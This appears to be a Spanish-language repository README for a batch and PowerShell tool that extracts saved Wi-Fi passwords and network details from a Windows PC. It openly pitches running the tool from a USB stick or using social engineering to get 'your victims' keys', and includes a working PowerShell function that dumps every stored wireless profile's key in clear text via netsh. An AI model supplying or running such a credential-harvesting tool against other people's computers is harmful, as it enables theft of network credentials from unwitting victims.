# Wi-Fi



El programa esta desarrollado en bat y en powershell su objetivo es extraer las contraseña he información de red que tiene un pc ya sea manualmente o automáticamente
Solo las contraseñas guardadas de la pc ,puedes guardar el programa en una USB y ejecutarlo de ahí mismo. o usar diversas técnicas de ingeniería social para poder obtener las claves de tus victimas.. .

- Pasos a seguir
```
1.-Descargar el programa
2.-ejecutamos el programa
3.-opción 1 información de la red inalambrica
4.-opción 2 extraer las claves de wifi manualmente
5.-opción 3 extraer las claves de wifi automáticamente```
hasta finalizar

Function Get-WLAN_Profiles {
	param (
		[ValidateSet('es-ES','en-EN')]
		$LANGUAGE = $Host.CurrentUICulture.Name
	)
	$LANGUAGES = @{
		'es-ES' = New-Object psobject -Property @{
			'user_profiles_text' 	 = 'Perfil de todos los usuarios'
			'profile_not_found_text' = 'No se encuentra el perfil'
			'ssid_name_text' 		 = 'Nombre de SSID'
			'network_type_text' 	 = 'Tipo de red'
			'authentication_text'	 = 'Autenticación'
			'encryption_text'	 	 = 'Cifrado'
			'key_text' 				 = 'Contenido de la clave'
		}
		'en-EN' = New-Object psobject -Property @{
			'user_profiles_text' 	 = 'All User Profile'
			'profile_not_found_text' = 'Profile not found'
			'ssid_name_text' 		 = 'SSID name'
			'network_type_text' 	 = 'Network Type'
			'authentication_text'	 = 'Authentication'
			'encryption_text'	 	 = 'Cipher'
			'key_text' 				 = 'Key Content'
		}
	}
	$LANG = $LANGUAGES."$LANGUAGE"

	function getValueByName ( $inputText, $nameString ) {
		$value = "";
		if ([regex]::IsMatch($inputText,"\b$nameString\b","IgnoreCase")) {
			$value = ([regex]::Replace($inputText,"^[^:]*: ","")); 
		}
		return $value.Trim();
	}

	$Profiles = @()
	netsh wlan show profiles | % {
		$profile = getValueByName $_ $LANG.'user_profiles_text';
		if ($profile) {
			$Profiles += $profile
		}
	}

	$WLAN_Profiles = @()
	$rowNumber = -1;
	$Profiles | % {
		$wlan_Profile = netsh wlan show profile $_ key=clear
		if ($wlan_Profile.Contains($LANG.'profile_not_found_text')){
			return
		}
		$InterfaceName = $null
		$wlan_Profile | % {
			if (!($InterfaceName)) {
				$InterfaceName = getValueByName $_ $LANG.'ssid_name_text'
				$InterfaceName = $InterfaceName.Trim('"')
							
				if ($InterfaceName) {
					$row = New-Object PSObject -Property @{
						InterfaceName = $InterfaceName
						SSID = $InterfaceName
						NetworkType=""
						Authentication=""
						Encryption=""
						Key=""
					}
					$rowNumber+=1
					$WLAN_Profiles += $row
					#$WLAN_Profiles | ft
					return
				}
			}
			if (!($WLAN_Profiles[$rowNumber].NetworkType)) {
				$NetworkType = getValueByName $_ $LANG.'network_type_text';
				if ($NetworkType) {
					  $WLAN_Profiles[$rowNumber].NetworkType = $NetworkType
				}
			}
			
			if (!($WLAN_Profiles[$rowNumber].Authentication)) {
				$Authentication = getValueByName $_ $LANG.'authentication_text';
				if ($Authentication) {
					  $WLAN_Profiles[$rowNumber].Authentication = $Authentication
				}
			}
			
			if (!($WLAN_Profiles[$rowNumber].Encryption)) {
				$Encryption = getValueByName $_ $LANG.'encryption_text';
				if ($Encryption) {
					  $WLAN_Profiles[$rowNumber].Encryption = $Encryption
				}
			}
			
			if (!($WLAN_Profiles[$rowNumber].Key)) {
				$Key = getValueByName $_ $LANG.'key_text';
				if ($Key) {
					  $WLAN_Profiles[$rowNumber].Key = $Key
				}
			}
		}
	}

	if ($WLAN_Profiles.Count -gt 0) {
		'Total WLAN_Profiles: ' + $WLAN_Profiles.Count
		<#return#> $WLAN_Profiles | Select-Object 		   SSID,
											 Authentication,
														Key,
												 Encryption,
												NetworkType
	} else {
		'No WLAN Profiles found!'
	}
}

```

